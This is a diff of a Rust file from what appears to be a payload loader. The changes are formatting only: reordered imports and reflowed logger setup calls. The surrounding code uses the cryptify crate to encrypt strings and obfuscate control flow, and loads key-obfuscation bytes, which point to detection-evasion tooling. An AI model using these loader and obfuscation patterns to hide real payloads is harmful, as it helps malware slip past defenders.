@@ -4,13 +4,13 @@ use crate::dataoperation::DataOperation;
 use crate::payload::Payload;
 use crate::payload_util::print_running_thread;
 
-use std::thread;
 use cryptify;
 use cryptify::encrypt_string;
+use std::thread;
 
 extern crate env_logger;
-use log::info;
 use log::error;
+use log::info;
 
 // ------ STANDARD compilation
 #[rustfmt::skip]
@@ -36,13 +36,18 @@ const DECRYPT_KEY_OBFUSCATION_STEPS: &[u8] = include_bytes!("/projects/config/in
 
 pub fn run_loader() {
     #[cfg(feature = "info")]
-    #[cfg(not(feature="debug"))]
-    env_logger::builder().filter_level(log::LevelFilter::Info).init();
+    #[cfg(not(feature = "debug"))]
+    env_logger::builder()
+        .filter_level(log::LevelFilter::Info)
+        .init();
 
     #[cfg(feature = "debug")]
-    env_logger::builder().filter_level(log::LevelFilter::Debug).init();
+    env_logger::builder()
+        .filter_level(log::LevelFilter::Debug)
+        .init();
 
     cryptify::flow_stmt!();
+
     let session_id: String = uuid::Uuid::new_v4().to_string();
     info!("{}{}", encrypt_string!("[+] session_id "), session_id);
     info!("");
